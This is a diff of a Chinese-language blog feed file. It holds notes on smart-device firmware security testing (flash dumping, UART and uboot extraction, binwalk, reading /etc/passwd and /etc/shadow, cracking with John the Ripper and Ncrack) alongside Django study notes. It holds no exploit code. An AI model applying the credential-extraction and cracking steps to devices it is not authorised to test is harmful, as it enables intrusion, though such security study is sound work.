+      <content type="html"><![CDATA[<h1 id="智能设备的组成"><a href="#智能设备的组成" class="headerlink" title="智能设备的组成"></a>智能设备的组成</h1><ul><li>CPU: X86/ARM/MIPS/PPC等  </li><li>内存: SDRAM/RAM  </li><li>存储: Flash/TF卡/SD卡/MMC卡/硬盘  </li><li>串口: 一般电路板会留，做调试用网口: 智能设备联网  </li><li>USB口: 接U盘做扩展存储用、也可接键盘和鼠标等  </li><li>无线接口: Wifi/蓝牙/ZigeBee等  </li><li>bootLoader: Uboot等  </li><li>操作系统: Linux/RT-Linux/VxWorks/uCOS-I<br><br><br><br></li></ul><h1 id="智能硬件设备测试简要流程"><a href="#智能硬件设备测试简要流程" class="headerlink" title="智能硬件设备测试简要流程"></a>智能硬件设备测试简要流程</h1><p>1、获取固件<br>2、逆向固件<br>3、分析固件漏洞/调试固件/Fuzz漏洞<br>4、漏洞验证(这一步要有硬件)<br>5、完成测试文档<br><br><br><br></p><h1 id="智能设备固件获取方法"><a href="#智能设备固件获取方法" class="headerlink" title="智能设备固件获取方法"></a>智能设备固件获取方法</h1><p>1、官网或联系售后索取升级包<br>2、在线升级, 抓包获取下载地址<br>3、逆向升级软件,软件内置解包和通讯算法<br>4、从硬件调试接口:JTAG/SWD, 利用调试工具的任意地址读取功能<br>5、拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件<br>6、用硬件电路的调试串口和固件的bootloader获取固件<br>7、通过利用网页和通讯漏洞获取固件敏感信息<br>8、用逻辑分析仪监听flash,ram获取信息<br>9、从串口进入系统后,用tar、nc、dd、echo、vi等命令提取<br><img src="\images\pasted-174.png" alt="upload successful"><br><br><br></p><h2 id="拆Flash后-用编程器获取固件"><a href="#拆Flash后-用编程器获取固件" class="headerlink" title="拆Flash后,用编程器获取固件"></a>拆Flash后,用编程器获取固件</h2><p>只需要三步, 但对大部分人很困难:<br>(1)焊下flash芯片<br>(2)用编程器提取固件内容<br>(3)把FLASH芯片焊回电路板<br><img src="\images\pasted-175.png" alt="upload successful"><br><img src="\images\pasted-176.png" alt="upload successful"><br><br><br></p><h2 id="从串口-UART-调试口获取固件"><a href="#从串口-UART-调试口获取固件" class="headerlink" title="从串口(UART)调试口获取固件"></a>从串口(UART)调试口获取固件</h2><ul><li>前提: 开发板上有串口调试接，需要我们找出隐藏的串口。  </li><li>串口按照电压有两种标准：RS232标准和TTL标准</li><li>RS232标准： 电压范围：-12V，+12V （负逻辑）</li><li>TTL标准： 电压范围：0，5V</li><li>串口引脚识别方法: 串口一般有4个引脚</li><li>VCC：电源电压为3.3V 或 5V</li><li>GND：电源电压地</li><li>RXD：数据接收引脚，万用表测电压为低（如硬件上拉可为高）</li><li>TXD：数据发送引脚，万用表测电压一般为高</li><li>试验: 用万用表找串口<br><br><br></li></ul><h2 id="从串口进入系统"><a href="#从串口进入系统" class="headerlink" title="从串口进入系统"></a>从串口进入系统</h2><ul><li>SecureCRT的使用</li><li>通过开发留下的串口, 进入系统</li><li>尝试运行系统的调试命令</li><li>学习串口日志的记录和回看方法<br><br><br></li></ul><h2 id="从串口uboot提取固件流程"><a href="#从串口uboot提取固件流程" class="headerlink" title="从串口uboot提取固件流程"></a>从串口uboot提取固件流程</h2><p>(1)获取flash固件信息<br>(2)用md命令提取固件信息<br>(3)记录串口输出信息<br>(4)分析输出信息,获取固件<br><br><br></p><h2 id="uboot提取固件-md命令"><a href="#uboot提取固件-md命令" class="headerlink" title="uboot提取固件: md命令"></a>uboot提取固件: md命令</h2><p>md - memory display (显示内存RAM/SDRAM内容)<br>用法: md 起始地址 长度 （地址和长度为十六进制格式）<br>思考: md 命令是否能提取固件？ 怎么提取固件呢？<br>可以先把flash中的内容拷贝到内存，再从内存打印<br><br><br><br></p><h1 id="固件提取技术"><a href="#固件提取技术" class="headerlink" title="固件提取技术"></a>固件提取技术</h1><p><img src="\images\pasted-177.png" alt="upload successful"><br><img src="\images\pasted-178.png" alt="upload successful"><br><img src="\images\pasted-179.png" alt="upload successful"></p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>提取文件命令：binwalk -e firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me -d 5 firmware.bin<br><br><br></p><h2 id="IDA-pro"><a href="#IDA-pro" class="headerlink" title="IDA pro"></a>IDA pro</h2><p>IDA Pro（简称IDA）是一款交互式反汇编工具<br>IDA最主要的特性是交互和多处理器<br>IDA支持的文件类型非常丰富除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台文件格式。<br><br><br></p><h2 id="retdec"><a href="#retdec" class="headerlink" title="retdec"></a>retdec</h2><p>反编译器不限于任何特定的目标架构，操作系统或可执行文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX和原始机器码。<br>支持的体系结构（仅限32b）：Intel x86，ARM，MIPS，PIC32和Power<br><br><br></p><h2 id="敏感信息收集工具Firmwalker"><a href="#敏感信息收集工具Firmwalker" class="headerlink" title="敏感信息收集工具Firmwalker"></a>敏感信息收集工具Firmwalker</h2><p>Firmwalker是一个非常棒的固件分析入手工具，能够帮您找到感兴趣的文件，以便进行更深入的分析<br><br><br><br></p><h1 id="固件的弱密码"><a href="#固件的弱密码" class="headerlink" title="固件的弱密码"></a>固件的弱密码</h1><h2 id="Linux密码文件"><a href="#Linux密码文件" class="headerlink" title="Linux密码文件"></a>Linux密码文件</h2><p>/etc/passwd 密码的前两位是”盐”值，是一个随机数，后面跟的是加密的密码<br>/etc/shadow 只有root可读<br><br><br></p><h2 id="etc-passwd文件简介"><a href="#etc-passwd文件简介" class="headerlink" title="/etc/passwd文件简介"></a>/etc/passwd文件简介</h2><p>adm拥有账号文件，起始目录/var/adm通常包括日志文件<br>bin拥有用户命令的可执行文件<br>daemon用来执行系统守护进程<br>games用来玩游戏<br>halt用来执行halt命令<br>lp拥有打印机后台打印文件<br>mail拥有与邮件相关的进程和文件<br>news拥有与usenet相关的进程和文件<br>nobody被NFS（网络文件系统）使用<br>shutdown执行shutdown命令<br>sync执行sync命令<br>uucp拥有uucp工具和文件<br><br><br></p><h2 id="实用破解法：社工字典法"><a href="#实用破解法：社工字典法" class="headerlink" title="实用破解法：社工字典法"></a>实用破解法：社工字典法</h2><ul><li>John the Ripper（john-1.8.0）<br>John是一款快速密码破解工具，目前支持Unix,Windows,DOS,BeOS和OpenVMS<br>主要目的是用于发现Unix弱密码另外支持许多密码hash类型，如unix系统、windows的LM<br>hash等<br><img src="\images\pasted-180.png" alt="upload successful"><br><br><br></li></ul><h1 id="固件漏洞挖掘"><a href="#固件漏洞挖掘" class="headerlink" title="固件漏洞挖掘"></a>固件漏洞挖掘</h1><p>Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用 Ncrack做渗透测试。<br>Ncrack支持windows和linux系统，并且可以测试暴力破解测试，支持的协议包括RDP、 SSH、 HTTP(s)、 SMB、POP3(s)、 VNC、 FTP, SIP、 Redis、 PostgreSQL、MySQL 以及Telnet。  </p>]]></content>
+      
       <categories>
-        <category>Django学习笔记</category>
-        <category>4_Django模板</category>
+          
+          <category> 工控安全 </category>
+          
       </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>django</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Django学习笔记_3]]></title>
-    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3%2F</url>
-    <content type="text"><![CDATA[Models.py ORM对象-关系-映射根据对象的类型生成表结构将对象，列表的操作，转换为sql语句将sql查询到的结果转换为对象，列表 Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表 使用mysql数据库pip install mysql-python 在mysql中创建数据库create database test2 charest=utf8; 打开settings.py文件，修改DATABASES项可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)settings.py中改个配置就可以用我们的mysql数据库 开发流程 使用已有数据库生成模型类python manage.py inspectdb &gt; booktest/models.py 创建添加应用python manage.py startapp booktest创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS 定义模型 定义属性 字段类型 字段选项 关系 示例 在models.py中定义表结构 生成迁移之后python manage.py makemigrations 执行迁移之后python manage.py migrate 类的属性 管理器（可自定义）模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射） 模型类的创建方法&emsp;&emsp;在自定义的模型类中写init方法时会报错，因为model.Model中已经有了init方法，那我们怎么快捷创建每个模型类呢？解决方法： (1) 创建类方法。 我们在模型类中，自定义一个创建模型类的方法我们在python manage.py shell中，创建一个abc对象：报错是因为时区问题，不影响 (2) 在自定义的管理器中，创建对象方法 （不在类中做这件事） 模型查询 查询集 限制查询集 查询集的缓存 字段查询 比较运算符 聚合函数 F对象 Q对象]]></content>
+      
+      
+        <tags>
+            
+            <tag> 固件分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Django学习笔记_4</title>
+      <link href="/2018/07/29/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/"/>
+      <url>/2018/07/29/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/</url>
+      <content type="html"><![CDATA[<p><strong><em>Templates</em></strong></p><hr><p><br><br><br></p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p><img src="\images\pasted-149.png" alt="upload successful"></p><h2 id="模板处理"><a href="#模板处理" class="headerlink" title="模板处理"></a>模板处理</h2><p><img src="\images\pasted-150.png" alt="upload successful"></p><h2 id="快捷函数"><a href="#快捷函数" class="headerlink" title="快捷函数"></a>快捷函数</h2><p><img src="\images\pasted-151.png" alt="upload successful"><br><br><br><br></p><h1 id="定义模板"><a href="#定义模板" class="headerlink" title="定义模板"></a>定义模板</h1><p><strong><em>模板语言包括</em></strong></p><ul><li>变量</li><li>标签    </li><li>过滤器    { % 代码块 %}</li><li>注释      <h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><img src="\images\pasted-152.png" alt="upload successful"><h2 id="在模板中调用对象的方法"><a href="#在模板中调用对象的方法" class="headerlink" title="在模板中调用对象的方法"></a>在模板中调用对象的方法</h2><img src="\images\pasted-153.png" alt="upload successful"><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><img src="\images\pasted-154.png" alt="upload successful"><br><img src="\images\pasted-155.png" alt="upload successful"><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><img src="\images\pasted-156.png" alt="upload successful"><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><img src="\images\pasted-157.png" alt="upload successful"><br><br><br><br></li></ul><h1 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h1><p><img src="\images\pasted-158.png" alt="upload successful"></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><img src="\images\pasted-159.png" alt="upload successful"></p><h2 id="三层继承模型"><a href="#三层继承模型" class="headerlink" title="三层继承模型"></a>三层继承模型</h2><p><img src="\images\pasted-160.png" alt="upload successful"><br><br><br><br></p><h1 id="HTML转义"><a href="#HTML转义" class="headerlink" title="HTML转义"></a>HTML转义</h1><p><img src="\images\pasted-161.png" alt="upload successful"></p><h2 id="会被自动转义的字符"><a href="#会被自动转义的字符" class="headerlink" title="会被自动转义的字符"></a>会被自动转义的字符</h2><p><img src="\images\pasted-162.png" alt="upload successful"></p><h2 id="关闭转义"><a href="#关闭转义" class="headerlink" title="关闭转义"></a>关闭转义</h2><p><img src="\images\pasted-163.png" alt="upload successful"></p><h2 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h2><p><img src="\images\pasted-164.png" alt="upload successful"><br><br><br><br></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><img src="\images\pasted-166.png" alt="upload successful"><br><br><br><br></p><h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><p><img src="\images\pasted-167.png" alt="upload successful"></p><h2 id="验证码视图"><a href="#验证码视图" class="headerlink" title="验证码视图"></a>验证码视图</h2><p><img src="\images\pasted-168.png" alt="upload successful"><br><img src="\images\pasted-169.png" alt="upload successful"><br><img src="\images\pasted-170.png" alt="upload successful"></p><h2 id="配置url"><a href="#配置url" class="headerlink" title="配置url"></a>配置url</h2><p><img src="\images\pasted-171.png" alt="upload successful"></p><h2 id="显示验证码"><a href="#显示验证码" class="headerlink" title="显示验证码"></a>显示验证码</h2><p><img src="\images\pasted-172.png" alt="upload successful"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="\images\pasted-173.png" alt="upload successful"></p><h2 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h2><ul><li>可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中<br><br><br><br></li></ul>]]></content>
+      
       <categories>
-        <category>Django学习笔记</category>
-        <category>3_Django模型</category>
+          
+          <category> Django学习笔记 </category>
+          
+          <category> 4_Django模板 </category>
+          
       </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>django</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Django学习笔记_2]]></title>
-    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2%2F</url>
-    <content type="text"><![CDATA[Views.py 视图 URL匹配的过程url也可以写在应用(booktest)中: URLconf 其他的URLconfs URL的反向解析 错误视图Django原生自带几个默认视图用于处理HTTP错误 404(page not found)视图 500(server error)视图 400(bad request)视图 HttpRequest对象 服务器收到http协议的请求后，会根据报文创建HttpRequest对象 视图函数的第一个参数是HttpRequest对象 在django.http模块中定义了HttpRequest对象的API属性方法 1、get()作用：根据键获取值只能获取一个值www.baidu.com/abc?a=1&amp;b=2&amp;c=3 2、getlist()将键的值以列表的形式返回可以获取多个值www.baidu.com/abc?a=1&amp;a=2&amp;c=3 QueryDict对象GET属性POST属性 HttpResponse对象 属性 方法 子类HttpResponseRedirectHttpResponseRedirect()可简写为redirect() 子类JsonResponse 状态保持 启用session 使用session 用户登录示例在views.py中创建视图 配置url 创建模板index.html 创建模板login.html 会话过期时间 存储session 使用Redis缓存session 登录认证逻辑利用django封装好的authenticate()函数，认证登录Django防止越权，直接访问127.0.0.1:8000/manage/不允许访问 from django.contrib.auth.decorators import login_required @login_required 如果想限制某个试图函数必须登录才能访问，则在函数前面加上@login_required即可(记得清除浏览器缓存)]]></content>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> django </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Django学习笔记_3</title>
+      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/"/>
+      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/</url>
+      <content type="html"><![CDATA[<p><strong><em>Models.py</em></strong></p><hr><p><br><br><br></p><h1 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h1><h2 id="对象-关系-映射"><a href="#对象-关系-映射" class="headerlink" title="对象-关系-映射"></a>对象-关系-映射</h2><p>根据对象的类型生成表结构<br>将对象，列表的操作，转换为sql语句<br>将sql查询到的结果转换为对象，列表  </p><p>Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表<br><img src="\images\pasted-75.png" alt="upload successful"><br><br></p><h2 id="使用mysql数据库"><a href="#使用mysql数据库" class="headerlink" title="使用mysql数据库"></a>使用mysql数据库</h2><p>pip install mysql-python</p><ul><li>在mysql中创建数据库<br>create database test2 charest=utf8;</li><li>打开settings.py文件，修改DATABASES项<br>可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)<br><img src="\images\pasted-77.png" alt="upload successful"><br><img src="\images\pasted-79.png" alt="upload successful"><br>settings.py中改个配置就可以用我们的mysql数据库<br><img src="\images\pasted-76.png" alt="upload successful"><br><img src="\images\pasted-78.png" alt="upload successful"><br><br></li></ul><h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p><img src="\images\pasted-81.png" alt="upload successful"></p><h2 id="使用已有数据库生成模型类"><a href="#使用已有数据库生成模型类" class="headerlink" title="使用已有数据库生成模型类"></a>使用已有数据库生成模型类</h2><p>python manage.py inspectdb &gt; booktest/models.py<br><br><br><br></p><h1 id="创建添加应用"><a href="#创建添加应用" class="headerlink" title="创建添加应用"></a>创建添加应用</h1><p>python manage.py startapp booktest<br>创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS<br><img src="\images\pasted-82.png" alt="upload successful"></p><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><p><img src="\images\pasted-83.png" alt="upload successful"></p><h2 id="定义属性"><a href="#定义属性" class="headerlink" title="定义属性"></a>定义属性</h2><p><img src="\images\pasted-84.png" alt="upload successful"></p><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p><img src="\images\pasted-85.png" alt="upload successful"></p><h2 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h2><p><img src="\images\pasted-86.png" alt="upload successful"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="\images\pasted-87.png" alt="upload successful"><br><br><br></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><ul><li>在models.py中定义表结构<br><img src="\images\pasted-88.png" alt="upload successful"></li><li>生成迁移之后<br>python manage.py makemigrations<br><img src="\images\pasted-89.png" alt="upload successful"></li><li>执行迁移之后<br>python manage.py migrate<br><img src="\images\pasted-90.png" alt="upload successful"><br><br><br></li></ul><h1 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h1><p><img src="\images\pasted-91.png" alt="upload successful"></p><h2 id="管理器（可自定义）"><a href="#管理器（可自定义）" class="headerlink" title="管理器（可自定义）"></a>管理器（可自定义）</h2><p>模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射）<br><img src="\images\pasted-92.png" alt="upload successful"><br><img src="\images\pasted-93.png" alt="upload successful"><br><img src="\images\pasted-94.png" alt="upload successful"><br><img src="\images\pasted-95.png" alt="upload successful"></p><h2 id="模型类的创建方法"><a href="#模型类的创建方法" class="headerlink" title="模型类的创建方法"></a>模型类的创建方法</h2><p>&emsp;&emsp;在自定义的模型类中写<strong>init</strong>方法时会报错，因为model.Model中已经有了<strong>init</strong>方法，那我们怎么快捷创建每个模型类呢？<br><strong><em>解决方法：</em></strong>  </p><ul><li>(1) 创建<strong><em>类方法</em></strong>。 我们在模型类中，自定义一个创建模型类的方法<br><img src="\images\pasted-96.png" alt="upload successful"><br>我们在python manage.py shell中，创建一个abc对象：<br><img src="\images\pasted-97.png" alt="upload successful"><br>报错是因为时区问题，不影响<br><img src="\images\pasted-98.png" alt="upload successful"></li><li>(2) 在<strong><em>自定义的管理器</em></strong>中，创建对象方法 （不在类中做这件事）<br><img src="\images\pasted-99.png" alt="upload successful"><br><img src="\images\pasted-100.png" alt="upload successful"><br><img src="\images\pasted-101.png" alt="upload successful"><br><br><br></li></ul><h1 id="模型查询"><a href="#模型查询" class="headerlink" title="模型查询"></a>模型查询</h1><p><img src="\images\pasted-102.png" alt="upload successful"></p><h2 id="查询集"><a href="#查询集" class="headerlink" title="查询集"></a>查询集</h2><p><img src="\images\pasted-103.png" alt="upload successful"></p><h3 id="限制查询集"><a href="#限制查询集" class="headerlink" title="限制查询集"></a>限制查询集</h3><p><img src="\images\pasted-104.png" alt="upload successful"></p><h3 id="查询集的缓存"><a href="#查询集的缓存" class="headerlink" title="查询集的缓存"></a>查询集的缓存</h3><p><img src="\images\pasted-105.png" alt="upload successful"></p><h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p><img src="\images\pasted-106.png" alt="upload successful"></p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><img src="\images\pasted-107.png" alt="upload successful"><br><img src="\images\pasted-108.png" alt="upload successful"><br><br><br></p><h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><p><img src="\images\pasted-109.png" alt="upload successful"></p><h2 id="F对象"><a href="#F对象" class="headerlink" title="F对象"></a>F对象</h2><p><img src="\images\pasted-110.png" alt="upload successful"></p><h2 id="Q对象"><a href="#Q对象" class="headerlink" title="Q对象"></a>Q对象</h2><p><img src="\images\pasted-111.png" alt="upload successful"></p>]]></content>
+      
       <categories>
-        <category>Django学习笔记</category>
-        <category>2_Django视图</category>
+          
+          <category> Django学习笔记 </category>
+          
+          <category> 3_Django模型 </category>
+          
       </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>django</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Django学习笔记_1]]></title>
-    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1%2F</url>
-    <content type="text"><![CDATA[环境安装Django安装：pip install django==1.10.3安装前段框架Bootstrap3，利用其结合Django开发Web页面： pip install django-bootstrap3使用PyMysql连接mysql数据库： pip install PyMySQL Django框架介绍&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MVT模式。它们各自的职责如下： 层次 职责 模型（Model），即数据存取层 处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。 模板(Template)，即业务逻辑层 处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。 视图（View），即表现层 存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。 &emsp;&emsp;从以上表述可以看出Django 视图不处理用户输入，而仅仅决定要展现哪些数据给用户，而Django 模板 仅仅决定如何展现Django视图指定的数据。或者说, Django将MVC中的视图进一步分解为 Django视图 和 Django模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得Django的模板可以根据需要随时替换，而不仅仅限制于内置的模板。 &emsp;&emsp;至于MVC控制器部分，由Django框架的URLconf来实现。URLconf机制是使用正则表达式匹配URL，然后调用合适的Python函数。URLconf对于URL的规则没有任何限制，你完全可以设计成任意的URL风格，不管是传统的，RESTful的，或者是另类的。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作。在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。 web框架 什么是ORM？ Django框架&emsp;&emsp;目录分开，就必须有机制将他们在内里进行耦合。在Django中，urls、orm、static、settings等起着重要的作用。一个典型的业务流程是如下图所示：&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MTV模式。 Django优点 强大的数据库功能 用 python 的类继承，几行代码就可以拥有一个丰富、动态的数据库操作接口（API），如果需要，你也能执行 SQL 语句ORM（Object-Relational-Mapping“对象-关系-映射”），它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库。 自带强大的后台功能 几行代码就让网站拥有一个强大的后台，轻松管理内容。 优雅的网址 在urls.py中用正则匹配网址，传递到对应的函数。(需要注意的是:正则是一种独立的语法，并不是哪个语言所拥有的。) 具有模板系统 强大，易扩展的模板系统，设计简易，代码和样式分开设计，更易管理。 缓存系统&emsp;&emsp;Django和memcached、redis或者其他的缓存系统联用，表现更出色，提高了页面的加载速度。&emsp;&emsp;templates 文件夹views.py 中的函数渲染 templates 中的 Html 模板，得到动态内容的网页，当然可以用缓存来提高速度。 国际化 完全支持多语言应用，允许你定义翻译的字符，轻松翻译成不同国家的语言。 Django基本操作创建项目(test1)django-admin startproject test1 创建应用(booktest)python manage.py startapp booktest 创建更改的文件 （生成迁移）python manage.py makemigrations 将生成的py文件应用到数据库 （执行迁移）python manage.py migrate 创建一个管理员用户（按提示输入用户名，邮箱，密码）python manage.py createsuperuser 运行（可以指定ip地址和端口号）#python manage.py runserver 127.0.0.1:8001]]></content>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> django </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Django学习笔记_2</title>
+      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/"/>
+      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/</url>
+      <content type="html"><![CDATA[<p><strong><em>Views.py</em></strong></p><hr><p><br><br><br></p><h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><p><img src="\images\pasted-112.png" alt="upload successful"></p><h2 id="URL匹配的过程"><a href="#URL匹配的过程" class="headerlink" title="URL匹配的过程"></a>URL匹配的过程</h2><p><img src="\images\pasted-113.png" alt="upload successful"><br><img src="\images\pasted-114.png" alt="upload successful"><br><img src="\images\pasted-115.png" alt="upload successful"><br><img src="\images\pasted-116.png" alt="upload successful"><br>url也可以写在应用(booktest)中:<br><img src="\images\pasted-117.png" alt="upload successful"><br><img src="\images\pasted-118.png" alt="upload successful"><br><img src="\images\pasted-119.png" alt="upload successful"></p><h2 id="URLconf"><a href="#URLconf" class="headerlink" title="URLconf"></a>URLconf</h2><p><img src="\images\pasted-122.png" alt="upload successful"></p><h2 id="其他的URLconfs"><a href="#其他的URLconfs" class="headerlink" title="其他的URLconfs"></a>其他的URLconfs</h2><p><img src="\images\pasted-120.png" alt="upload successful"></p><h2 id="URL的反向解析"><a href="#URL的反向解析" class="headerlink" title="URL的反向解析"></a>URL的反向解析</h2><p><img src="\images\pasted-121.png" alt="upload successful"><br><br><br><br></p><h1 id="错误视图"><a href="#错误视图" class="headerlink" title="错误视图"></a>错误视图</h1><p>Django原生自带几个默认视图用于处理HTTP错误</p><h2 id="404-page-not-found-视图"><a href="#404-page-not-found-视图" class="headerlink" title="404(page not found)视图"></a>404(page not found)视图</h2><p><img src="\images\pasted-123.png" alt="upload successful"></p><h2 id="500-server-error-视图"><a href="#500-server-error-视图" class="headerlink" title="500(server error)视图"></a>500(server error)视图</h2><p><img src="\images\pasted-130.png" alt="upload successful"></p><h2 id="400-bad-request-视图"><a href="#400-bad-request-视图" class="headerlink" title="400(bad request)视图"></a>400(bad request)视图</h2><p><img src="\images\pasted-131.png" alt="upload successful"><br><br><br><br></p><h1 id="HttpRequest对象"><a href="#HttpRequest对象" class="headerlink" title="HttpRequest对象"></a>HttpRequest对象</h1><ul><li>服务器收到http协议的请求后，会根据报文创建HttpRequest对象  </li><li>视图函数的第一个参数是HttpRequest对象</li><li>在django.http模块中定义了HttpRequest对象的API<br><img src="\images\pasted-124.png" alt="upload successful"><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><img src="\images\pasted-125.png" alt="upload successful"><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2></li><li>1、get()<br>作用：根据键获取值<br>只能获取一个值<br><a href="http://www.baidu.com/abc?a=1&amp;b=2&amp;c=3" target="_blank" rel="noopener">www.baidu.com/abc?a=1&amp;b=2&amp;c=3</a></li><li>2、getlist()<br>将键的值以列表的形式返回<br>可以获取多个值<br><a href="http://www.baidu.com/abc?a=1&amp;a=2&amp;c=3" target="_blank" rel="noopener">www.baidu.com/abc?a=1&amp;a=2&amp;c=3</a>  <h2 id="QueryDict对象"><a href="#QueryDict对象" class="headerlink" title="QueryDict对象"></a>QueryDict对象</h2><img src="\images\pasted-126.png" alt="upload successful"><h2 id="GET属性"><a href="#GET属性" class="headerlink" title="GET属性"></a>GET属性</h2><img src="\images\pasted-127.png" alt="upload successful"><br><img src="\images\pasted-128.png" alt="upload successful"><br><img src="\images\pasted-129.png" alt="upload successful"><h2 id="POST属性"><a href="#POST属性" class="headerlink" title="POST属性"></a>POST属性</h2><img src="\images\pasted-137.png" alt="upload successful"><br><br><br><br></li></ul><h1 id="HttpResponse对象"><a href="#HttpResponse对象" class="headerlink" title="HttpResponse对象"></a>HttpResponse对象</h1><p><img src="\images\pasted-132.png" alt="upload successful"></p><h2 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h2><p><img src="\images\pasted-133.png" alt="upload successful"></p><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="子类HttpResponseRedirect"><a href="#子类HttpResponseRedirect" class="headerlink" title="子类HttpResponseRedirect"></a>子类HttpResponseRedirect</h2><p><img src="\images\pasted-135.png" alt="upload successful"><br><strong><em>HttpResponseRedirect()可简写为redirect()</em></strong></p><h2 id="子类JsonResponse"><a href="#子类JsonResponse" class="headerlink" title="子类JsonResponse"></a>子类JsonResponse</h2><p><img src="\images\pasted-136.png" alt="upload successful"><br><br><br><br></p><h1 id="状态保持"><a href="#状态保持" class="headerlink" title="状态保持"></a>状态保持</h1><p><img src="\images\pasted-138.png" alt="upload successful"></p><h2 id="启用session"><a href="#启用session" class="headerlink" title="启用session"></a>启用session</h2><p><img src="\images\pasted-139.png" alt="upload successful"></p><h2 id="使用session"><a href="#使用session" class="headerlink" title="使用session"></a>使用session</h2><p><img 